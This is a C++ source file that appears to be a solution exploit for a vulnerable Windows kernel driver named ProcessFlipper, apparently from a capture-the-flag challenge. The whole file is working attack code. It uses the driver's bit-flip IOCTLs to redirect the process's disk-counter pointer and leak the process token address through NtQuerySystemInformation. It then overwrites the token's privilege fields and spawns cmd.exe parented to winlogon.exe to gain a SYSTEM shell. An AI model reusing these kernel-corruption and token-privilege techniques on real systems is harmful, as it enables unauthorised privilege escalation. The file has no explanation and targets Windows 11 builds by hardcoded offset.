#include <Windows.h>
#include <winioctl.h>
#include <psapi.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <stdlib.h>
#include "../ProcessFlipper/Public.h"

// constexpr int DiskCounterOffset = 0x8b8; // windows 11 23h2
constexpr int DiskCounterOffset = 0x638; // windows 11 24h2
//constexpr int TokenOffset = 0x4b8;
constexpr int TokenOffset = 0x248;

typedef enum _SYSTEM_INFORMATION_CLASS
{
    SystemProcessInformation = 5,
} SYSTEM_INFORMATION_CLASS;

typedef LONG       KPRIORITY;
typedef LONG       KTHREAD_STATE;
typedef LONG       KWAIT_REASON;

typedef struct _CLIENT_ID
{
    HANDLE UniqueProcess;
    HANDLE UniqueThread;
} CLIENT_ID, * PCLIENT_ID;

typedef struct _UNICODE_STRING {
    USHORT         Length;
    USHORT         MaximumLength;
    PWSTR          Buffer;
} UNICODE_STRING;

typedef struct _SYSTEM_THREAD_INFORMATION
{
    LARGE_INTEGER KernelTime;
    LARGE_INTEGER UserTime;
    LARGE_INTEGER CreateTime;
    ULONG WaitTime;
    ULONG_PTR StartAddress;
    CLIENT_ID ClientId;
    KPRIORITY Priority;
    KPRIORITY BasePriority;
    ULONG ContextSwitches;
    KTHREAD_STATE ThreadState;
    KWAIT_REASON WaitReason;
} SYSTEM_THREAD_INFORMATION, * PSYSTEM_THREAD_INFORMATION;

typedef struct _PROCESS_DISK_COUNTERS
{
    ULONGLONG BytesRead;
    ULONGLONG BytesWritten;
    ULONGLONG ReadOperationCount;
    ULONGLONG WriteOperationCount;
    ULONGLONG FlushOperationCount;
} PROCESS_DISK_COUNTERS, * PPROCESS_DISK_COUNTERS;

typedef struct _SYSTEM_PROCESS_INFORMATION
{
    ULONG NextEntryOffset;
    ULONG NumberOfThreads;
    LARGE_INTEGER WorkingSetPrivateSize; // since VISTA
    ULONG HardFaultCount; // since WIN7
    ULONG NumberOfThreadsHighWatermark; // since WIN7
    ULONGLONG CycleTime; // since WIN7
    LARGE_INTEGER CreateTime;
    LARGE_INTEGER UserTime;
    LARGE_INTEGER KernelTime;
    UNICODE_STRING ImageName;
    KPRIORITY BasePriority;
    HANDLE UniqueProcessId;
    HANDLE InheritedFromUniqueProcessId;
    ULONG HandleCount;
    ULONG SessionId;
    ULONG_PTR UniqueProcessKey; // since VISTA (requires SystemExtendedProcessInformation)
    SIZE_T PeakVirtualSize;
    SIZE_T VirtualSize;
    ULONG PageFaultCount;
    SIZE_T PeakWorkingSetSize;
    SIZE_T WorkingSetSize;
    SIZE_T QuotaPeakPagedPoolUsage;
    SIZE_T QuotaPagedPoolUsage;
    SIZE_T QuotaPeakNonPagedPoolUsage;
    SIZE_T QuotaNonPagedPoolUsage;
    SIZE_T PagefileUsage;
    SIZE_T PeakPagefileUsage;
    SIZE_T PrivatePageCount;
    LARGE_INTEGER ReadOperationCount;
    LARGE_INTEGER WriteOperationCount;
    LARGE_INTEGER OtherOperationCount;
    LARGE_INTEGER ReadTransferCount;
    LARGE_INTEGER WriteTransferCount;
    LARGE_INTEGER OtherTransferCount;
    // SYSTEM_THREAD_INFORMATION Threads[1]; // SystemProcessInformation
    // SYSTEM_EXTENDED_THREAD_INFORMATION Threads[1]; // SystemExtendedProcessinformation
    // SYSTEM_EXTENDED_THREAD_INFORMATION + SYSTEM_PROCESS_INFORMATION_EXTENSION // SystemFullProcessInformation
} SYSTEM_PROCESS_INFORMATION, * PSYSTEM_PROCESS_INFORMATION;

typedef ULONG NTSTATUS;

typedef NTSTATUS (*tNtQuerySystemInformation)(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength);
tNtQuerySystemInformation NtQuerySystemInformation;

PVOID ProcessEPROCESS;

BOOL patch(HANDLE file, SIZE_T value)
{
    for (int i = 0; i < 64; ++i)
    {
        ULONG bitToFlip = DiskCounterOffset * 8 + i;
        ULONG bytesReturned;
        DWORD controlCode = ((((SIZE_T)value) >> i) & 1) ? IOCTL_PROCESS_SET : IOCTL_PROCESS_CLEAR;
        if (!DeviceIoControl(file, controlCode, &bitToFlip, sizeof(bitToFlip), NULL, 0, &bytesReturned, NULL))
        {
            printf("DeviceIoControl failed: %d %d\n", GetLastError(), i);
            return FALSE;
        }
    }

    return TRUE;
}

BOOL patchLeakToken(HANDLE file)
{
    ULONG value = 0x080 + TokenOffset - 0x8;

    for (int i = 0; i < 12; ++i)
    {
        ULONG bitToFlip = DiskCounterOffset * 8 + i;
        ULONG bytesReturned;
        DWORD controlCode = ((((SIZE_T)value) >> i) & 1) ? IOCTL_PROCESS_SET : IOCTL_PROCESS_CLEAR;
        if (!DeviceIoControl(file, controlCode, &bitToFlip, sizeof(bitToFlip), NULL, 0, &bytesReturned, NULL))
        {
            printf("DeviceIoControl failed: %d %d\n", GetLastError(), i);
            return FALSE;
        }
    }

    return TRUE;
}

PVOID freeThis;

SIZE_T leak()
{
    free(freeThis);
    freeThis = NULL;
    ULONG returnLength = 0;
    int status = NtQuerySystemInformation(SystemProcessInformation, nullptr, 0, &returnLength);
    printf("leak %d\n", returnLength);
    SYSTEM_PROCESS_INFORMATION* info = (SYSTEM_PROCESS_INFORMATION*)calloc(4, returnLength);
    status = NtQuerySystemInformation(SystemProcessInformation, info, returnLength, &returnLength);
    printf("leak %p %x\n", info, status);
    freeThis = info;
    SIZE_T result = 0;

    while (1)
    {
        PROCESS_DISK_COUNTERS* counters = (PROCESS_DISK_COUNTERS*)((char*)info + sizeof(SYSTEM_PROCESS_INFORMATION) + sizeof(SYSTEM_THREAD_INFORMATION) * info->NumberOfThreads);
        if (info->UniqueProcessId == (HANDLE)GetCurrentProcessId())
        {
            printf("%I64d %I64x %I64x %I64x %I64x %I64x\n", (LONGLONG)info->UniqueProcessId, counters->BytesRead, counters->BytesWritten, counters->ReadOperationCount, counters->WriteOperationCount, counters->FlushOperationCount);
            printf("----------------------\n");
            result = counters->BytesWritten;
        }

        if (info->NextEntryOffset == 0)
            break;

        info = (SYSTEM_PROCESS_INFORMATION*)((ULONG_PTR)info + info->NextEntryOffset);
    }

    return result;
}

void SpawnShell()
{
    PROCESSENTRY32 entry;
    HANDLE snapshot;

    entry.dwSize = sizeof(PROCESSENTRY32);

    snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

    INT pid = -1;
    if (Process32First(snapshot, &entry))
    {
        while (Process32Next(snapshot, &entry))
        {
            if (wcscmp(entry.szExeFile, L"winlogon.exe") == 0)
            {
                pid = entry.th32ProcessID;
                break;
            }
        }
    }

    CloseHandle(snapshot);

    puts("Spawning shell");

    HANDLE hWinLogon = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (hWinLogon == INVALID_HANDLE_VALUE)
    {
        printf("OpenProcess error %d\n", GetLastError());
        return;
    }

    STARTUPINFOEX si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));

    SIZE_T size;
    InitializeProcThreadAttributeList(NULL, 1, 0, &size);
    auto xxx = malloc(size);
    si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)xxx;
    InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &size);
    UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hWinLogon, sizeof(HANDLE),
        NULL, NULL);

    si.StartupInfo.cb = sizeof(STARTUPINFOEX);

    wchar_t cmdline[MAX_PATH];
    wcscpy_s(cmdline, L"cmd.exe");

    if (!CreateProcess(NULL, cmdline, NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT | CREATE_NEW_CONSOLE, NULL,
        L"C:\\", reinterpret_cast<LPSTARTUPINFO>(&si), &pi))
        printf("CreateProcess error %d\n", GetLastError());
}

int main()
{
    auto mod = LoadLibrary(L"ntdll.dll");
    NtQuerySystemInformation = (tNtQuerySystemInformation)GetProcAddress(mod, "NtQuerySystemInformation");

    auto file = CreateFile(L"\\\\.\\ProcessFlipper", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (file == INVALID_HANDLE_VALUE)
    {
        printf("CreateFileW failed: %d\n", GetLastError());
        return -1;
    }

    auto shell32 = CreateFileW(L"abc.txt", GENERIC_WRITE, FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_NO_BUFFERING, NULL);
    if (shell32 == INVALID_HANDLE_VALUE)
    {
        printf("cannot open mshtml\n");
        return -1;
    }
    static char tmp[0x100000];
    DWORD tmp2;

    patchLeakToken(file);
    auto token = leak() & ~0xf;
    printf("token = %I64x\n", token);

    patch(file, token + 0x40); // priv
    leak();
    WriteFile(shell32, tmp, 0x100000, &tmp2, NULL);
    leak();
    patch(file, token + 0x40 - 0x8); // priv
    leak();
    WriteFile(shell32, tmp, 0x100000, &tmp2, NULL);

    SpawnShell();
}
